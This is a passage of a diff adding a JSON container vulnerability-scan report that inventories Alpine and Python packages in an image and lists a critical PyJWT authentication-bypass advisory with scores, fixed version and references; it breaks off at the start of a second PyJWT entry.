+            "usr/share/zoneinfo/Pacific/Truk",
+            "usr/share/zoneinfo/Pacific/Wake",
+            "usr/share/zoneinfo/Pacific/Wallis",
+            "usr/share/zoneinfo/Pacific/Yap",
+            "usr/share/zoneinfo/US/Alaska",
+            "usr/share/zoneinfo/US/Aleutian",
+            "usr/share/zoneinfo/US/Arizona",
+            "usr/share/zoneinfo/US/Central",
+            "usr/share/zoneinfo/US/East-Indiana",
+            "usr/share/zoneinfo/US/Eastern",
+            "usr/share/zoneinfo/US/Hawaii",
+            "usr/share/zoneinfo/US/Indiana-Starke",
+            "usr/share/zoneinfo/US/Michigan",
+            "usr/share/zoneinfo/US/Mountain",
+            "usr/share/zoneinfo/US/Pacific",
+            "usr/share/zoneinfo/US/Samoa"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "xz-libs@5.8.4-r0",
+          "Name": "xz-libs",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/xz-libs@5.8.4-r0?arch=x86_64\u0026distro=3.24.4",
+            "UID": "6f0223c49816ec31"
+          },
+          "Version": "5.8.4-r0",
+          "Arch": "x86_64",
+          "SrcName": "xz",
+          "SrcVersion": "5.8.4-r0",
+          "Licenses": [
+            "GPL-2.0-or-later",
+            "0BSD",
+            "Public-Domain",
+            "LGPL-2.1-or-later"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "Digest": "sha1:8501065b1862821630174c663b45974462c296e1",
+          "InstalledFiles": [
+            "usr/lib/liblzma.so.5",
+            "usr/lib/liblzma.so.5.8.4"
+          ],
+          "AnalyzedBy": "apk"
+        },
+        {
+          "ID": "zlib@1.3.2-r1",
+          "Name": "zlib",
+          "Identifier": {
+            "PURL": "pkg:apk/alpine/zlib@1.3.2-r1?arch=x86_64\u0026distro=3.24.4",
+            "UID": "926381dc853769fb"
+          },
+          "Version": "1.3.2-r1",
+          "Arch": "x86_64",
+          "SrcName": "zlib",
+          "SrcVersion": "1.3.2-r1",
+          "Licenses": [
+            "Zlib"
+          ],
+          "Maintainer": "Natanael Copa \u003cncopa@alpinelinux.org\u003e",
+          "DependsOn": [
+            "musl@1.2.6-r3"
+          ],
+          "Layer": {
+            "Digest": "sha256:881fc932939efef04ca120ad44bbd2c0917851eb247aa4995428afb1e80ede17",
+            "DiffID": "sha256:75f1d9657d880da5f75298e8f40e9928bb6e260c50d26f97af196845307e3064"
+          },
+          "Digest": "sha1:4f525c8cc204f84b8b4ca40db3be389958f056c6",
+          "InstalledFiles": [
+            "usr/lib/libz.so.1",
+            "usr/lib/libz.so.1.3.2"
+          ],
+          "AnalyzedBy": "apk"
+        }
+      ]
+    },
+    {
+      "Target": "Python",
+      "Class": "lang-pkgs",
+      "Type": "python-pkg",
+      "Packages": [
+        {
+          "ID": "CacheControl@0.14.4",
+          "Name": "CacheControl",
+          "Identifier": {
+            "PURL": "pkg:pypi/cachecontrol@0.14.4",
+            "UID": "dd13399e19f85598",
+            "BOMRef": "pkg:pypi/CacheControl@0.14.4"
+          },
+          "Version": "0.14.4",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "Flask",
+          "Identifier": {
+            "PURL": "pkg:pypi/flask@3.1.2",
+            "UID": "87af912b5c704f2"
+          },
+          "Version": "3.1.2",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/flask-3.1.2.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "Jinja2",
+          "Identifier": {
+            "PURL": "pkg:pypi/jinja2@3.1.6",
+            "UID": "d14a28fd63e968fe"
+          },
+          "Version": "3.1.6",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/jinja2-3.1.6.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "MarkupSafe",
+          "Identifier": {
+            "PURL": "pkg:pypi/markupsafe@3.0.4",
+            "UID": "3db25dff0b8c4865"
+          },
+          "Version": "3.0.4",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/markupsafe-3.0.4.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "PyJWT",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "Version": "2.10.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "Werkzeug",
+          "Identifier": {
+            "PURL": "pkg:pypi/werkzeug@3.1.9",
+            "UID": "80a077aa0944e7ab"
+          },
+          "Version": "3.1.9",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/werkzeug-3.1.9.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "blinker",
+          "Identifier": {
+            "PURL": "pkg:pypi/blinker@1.9.0",
+            "UID": "90fa42efa6a0331d"
+          },
+          "Version": "1.9.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/blinker-1.9.0.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "certifi@2026.10.19",
+          "Name": "certifi",
+          "Identifier": {
+            "PURL": "pkg:pypi/certifi@2026.10.19",
+            "UID": "81cbf4abb485960d",
+            "BOMRef": "pkg:pypi/certifi@2026.10.19"
+          },
+          "Version": "2026.10.19",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "certifi",
+          "Identifier": {
+            "PURL": "pkg:pypi/certifi@2026.11.20",
+            "UID": "94c43dc115ac89b3"
+          },
+          "Version": "2026.11.20",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/certifi-2026.11.20.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "cffi",
+          "Identifier": {
+            "PURL": "pkg:pypi/cffi@2.1.1",
+            "UID": "19cff6b7a5799c37"
+          },
+          "Version": "2.1.1",
+          "Licenses": [
+            "MIT-0"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/cffi-2.1.1.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "charset-normalizer",
+          "Identifier": {
+            "PURL": "pkg:pypi/charset-normalizer@3.5.2",
+            "UID": "34b696ffb59014f0"
+          },
+          "Version": "3.5.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/charset_normalizer-3.5.2.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "click",
+          "Identifier": {
+            "PURL": "pkg:pypi/click@8.5.1",
+            "UID": "eadffb926c94bff7"
+          },
+          "Version": "8.5.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/click-8.5.1.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "cryptography",
+          "Identifier": {
+            "PURL": "pkg:pypi/cryptography@50.0.2",
+            "UID": "91ef327fd2e29659"
+          },
+          "Version": "50.0.2",
+          "Licenses": [
+            "Apache-2.0 OR BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/cryptography-50.0.2.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "distlib@0.4.2",
+          "Name": "distlib",
+          "Identifier": {
+            "PURL": "pkg:pypi/distlib@0.4.2",
+            "UID": "83a5c9b62ec97753",
+            "BOMRef": "pkg:pypi/distlib@0.4.2"
+          },
+          "Version": "0.4.2",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "distro@1.9.0",
+          "Name": "distro",
+          "Identifier": {
+            "PURL": "pkg:pypi/distro@1.9.0",
+            "UID": "bd156d4a411fc53b",
+            "BOMRef": "pkg:pypi/distro@1.9.0"
+          },
+          "Version": "1.9.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "gunicorn",
+          "Identifier": {
+            "PURL": "pkg:pypi/gunicorn@23.0.0",
+            "UID": "760bca6f9e46e325"
+          },
+          "Version": "23.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/gunicorn-23.0.0.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "idna@3.18",
+          "Name": "idna",
+          "Identifier": {
+            "PURL": "pkg:pypi/idna@3.18",
+            "UID": "31022705a21823b9",
+            "BOMRef": "pkg:pypi/idna@3.18"
+          },
+          "Version": "3.18",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "idna",
+          "Identifier": {
+            "PURL": "pkg:pypi/idna@3.20",
+            "UID": "d4bb865b9022e05b"
+          },
+          "Version": "3.20",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/idna-3.20.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "itsdangerous",
+          "Identifier": {
+            "PURL": "pkg:pypi/itsdangerous@2.2.0",
+            "UID": "a2a102a78f2112f"
+          },
+          "Version": "2.2.0",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/itsdangerous-2.2.0.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "msgpack@1.1.2",
+          "Name": "msgpack",
+          "Identifier": {
+            "PURL": "pkg:pypi/msgpack@1.1.2",
+            "UID": "33820b693fb1213e",
+            "BOMRef": "pkg:pypi/msgpack@1.1.2"
+          },
+          "Version": "1.1.2",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "packaging@26.2",
+          "Name": "packaging",
+          "Identifier": {
+            "PURL": "pkg:pypi/packaging@26.2",
+            "UID": "d2293465256103af",
+            "BOMRef": "pkg:pypi/packaging@26.2"
+          },
+          "Version": "26.2",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "packaging",
+          "Identifier": {
+            "PURL": "pkg:pypi/packaging@26.3",
+            "UID": "cb100a4c7b1a1183"
+          },
+          "Version": "26.3",
+          "Licenses": [
+            "Apache-2.0 OR BSD-2-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/packaging-26.3.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "Name": "pip",
+          "Identifier": {
+            "PURL": "pkg:pypi/pip@26.2.2",
+            "UID": "91e216a6458b9b3d"
+          },
+          "Version": "26.2.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/pip-26.2.2.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "platformdirs@4.10.0",
+          "Name": "platformdirs",
+          "Identifier": {
+            "PURL": "pkg:pypi/platformdirs@4.10.0",
+            "UID": "39e73539bc185fd7",
+            "BOMRef": "pkg:pypi/platformdirs@4.10.0"
+          },
+          "Version": "4.10.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "pycparser",
+          "Identifier": {
+            "PURL": "pkg:pypi/pycparser@3.12",
+            "UID": "f94f67864782eddd"
+          },
+          "Version": "3.12",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/pycparser-3.12.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "pygments@2.20.0",
+          "Name": "pygments",
+          "Identifier": {
+            "PURL": "pkg:pypi/pygments@2.20.0",
+            "UID": "186a7876d67f76ad",
+            "BOMRef": "pkg:pypi/pygments@2.20.0"
+          },
+          "Version": "2.20.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "pyproject-hooks@1.2.0",
+          "Name": "pyproject-hooks",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyproject-hooks@1.2.0",
+            "UID": "58fc64b7559b97b4",
+            "BOMRef": "pkg:pypi/pyproject-hooks@1.2.0"
+          },
+          "Version": "1.2.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "requests",
+          "Identifier": {
+            "PURL": "pkg:pypi/requests@2.32.5",
+            "UID": "72649ff1fad2da00"
+          },
+          "Version": "2.32.5",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/requests-2.32.5.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        },
+        {
+          "ID": "requests@2.34.2",
+          "Name": "requests",
+          "Identifier": {
+            "PURL": "pkg:pypi/requests@2.34.2",
+            "UID": "2a0401171e6c4b48",
+            "BOMRef": "pkg:pypi/requests@2.34.2"
+          },
+          "Version": "2.34.2",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "resolvelib@1.2.1",
+          "Name": "resolvelib",
+          "Identifier": {
+            "PURL": "pkg:pypi/resolvelib@1.2.1",
+            "UID": "f60b207972c0e175",
+            "BOMRef": "pkg:pypi/resolvelib@1.2.1"
+          },
+          "Version": "1.2.1",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "rich@14.2.0",
+          "Name": "rich",
+          "Identifier": {
+            "PURL": "pkg:pypi/rich@14.2.0",
+            "UID": "f35fb0355ff86659",
+            "BOMRef": "pkg:pypi/rich@14.2.0"
+          },
+          "Version": "14.2.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "setuptools@70.3.0",
+          "Name": "setuptools",
+          "Identifier": {
+            "PURL": "pkg:pypi/setuptools@70.3.0",
+            "UID": "ed58bcdeda2bae2f",
+            "BOMRef": "pkg:pypi/setuptools@70.3.0"
+          },
+          "Version": "70.3.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "tomli@2.4.1",
+          "Name": "tomli",
+          "Identifier": {
+            "PURL": "pkg:pypi/tomli@2.4.1",
+            "UID": "1e29675c16b2a90",
+            "BOMRef": "pkg:pypi/tomli@2.4.1"
+          },
+          "Version": "2.4.1",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "tomli-w@1.2.0",
+          "Name": "tomli-w",
+          "Identifier": {
+            "PURL": "pkg:pypi/tomli-w@1.2.0",
+            "UID": "f646bfe33ac428bf",
+            "BOMRef": "pkg:pypi/tomli-w@1.2.0"
+          },
+          "Version": "1.2.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "truststore@0.10.4",
+          "Name": "truststore",
+          "Identifier": {
+            "PURL": "pkg:pypi/truststore@0.10.4",
+            "UID": "a68328c63f498581",
+            "BOMRef": "pkg:pypi/truststore@0.10.4"
+          },
+          "Version": "0.10.4",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "ID": "urllib3@2.7.0",
+          "Name": "urllib3",
+          "Identifier": {
+            "PURL": "pkg:pypi/urllib3@2.7.0",
+            "UID": "19c2344f95ca9f4c",
+            "BOMRef": "pkg:pypi/urllib3@2.7.0"
+          },
+          "Version": "2.7.0",
+          "Layer": {
+            "Digest": "sha256:f9abc654947e09e316e7703544bd7e68123d383aeb70c5a9cf15be03e71721ce",
+            "DiffID": "sha256:228d5db3371529ac0f180ac55b7e6d67ca684b63e209bd4efa43915b488bd224"
+          },
+          "AnalyzedBy": "sbom"
+        },
+        {
+          "Name": "urllib3",
+          "Identifier": {
+            "PURL": "pkg:pypi/urllib3@2.8.0",
+            "UID": "9c02b946adb9c4f0"
+          },
+          "Version": "2.8.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "FilePath": "usr/local/lib/python3.13/site-packages/urllib3-2.8.0.dist-info/METADATA",
+          "AnalyzedBy": "python-pkg"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-102268",
+          "VendorIDs": [
+            "GHSA-ffc3-869f-jxw9"
+          ],
+          "PkgName": "PyJWT",
+          "PkgPath": "usr/local/lib/python3.13/site-packages/PyJWT-2.10.1.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pyjwt@2.10.1",
+            "UID": "20be61d8870c9491"
+          },
+          "InstalledVersion": "2.10.1",
+          "FixedVersion": "2.14.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:fedec2ec703659d97a141f740c40415a1202ef024ee6606aff9120d74a5503f8",
+            "DiffID": "sha256:6da2143d4daa1ec9957b2fea0ee37bec387abdc82ebddb8762da9ac3874b2cea"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-102268",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:94fb2effccdcf94766ebc100da896dca5f6d4d1454dd72ca2c0951c8cc4f13a0",
+          "Title": "pyjwt: PyJWT: Authentication bypass via improper public key validation",
+          "Description": "PyJWT is a Python implementation of JSON Web Token standards. Prior to 2.14.0, is_pem_format in jwt/utils.py is affected because is_pem_format does not recognize every PEM representation accepted by the cryptography loader. This occurs when an application mixes HMAC and asymmetric algorithms and supplies a mutated public-key PEM as raw key bytes. As a result, HMACAlgorithm.prepare_key treats the unrecognized asymmetric public key as an HMAC secret. Consequently, an attacker who knows the public key can forge authenticated HMAC tokens. This issue is fixed in version 2.14.0.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-347"
+          ],
+          "VendorSeverity": {
+            "alma": 4,
+            "amazon": 3,
+            "azure": 4,
+            "ghsa": 4,
+            "oracle-oval": 4,
+            "photon": 4,
+            "redhat": 4,
+            "rocky": 4,
+            "ubuntu": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 9.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:98503",
+            "https://access.redhat.com/security/cve/CVE-2026-102268",
+            "https://advisory.echohq.com/cve/CVE-2026-102268",
+            "https://bugzilla.redhat.com/2542671",
+            "https://bugzilla.redhat.com/2542685",
+            "https://bugzilla.redhat.com/2542687",
+            "https://bugzilla.redhat.com/2542690",
+            "https://bugzilla.redhat.com/2542695",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542671",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542685",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542687",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542690",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2542695",
+            "https://creativecommons.org/licenses/by/4.0/",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102266",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102267",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102268",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102271",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-102272",
+            "https://errata.almalinux.org/9/ALSA-2026-98503.html",
+            "https://errata.rockylinux.org/RLSA-2026:98503",
+            "https://github.com/jpadilla/pyjwt",
+            "https://github.com/jpadilla/pyjwt/commit/8b4e233a22206b34ec1186e912e75c0b2396ac07",
+            "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0",
+            "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffc3-869f-jxw9",
+            "https://linux.oracle.com/cve/CVE-2026-102268.html",
+            "https://linux.oracle.com/errata/ELSA-2026-98503.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-102268",
+            "https://ubuntu.com/security/notices/USN-8916-1",
+            "https://ubuntu.com/security/notices/USN-8916-2",
+            "https://www.cve.org/CVERecord?id=CVE-2026-102268"
+          ],
+          "PublishedDate": "2026-09-28T21:17:14.6Z",
+          "LastModifiedDate": "2026-10-07T20:25:03.03Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-102267",
+          "VendorIDs": [
+            "GHSA-9v7f-9g4p-ffgj"
+          ],
+          "PkgName": "PyJWT",
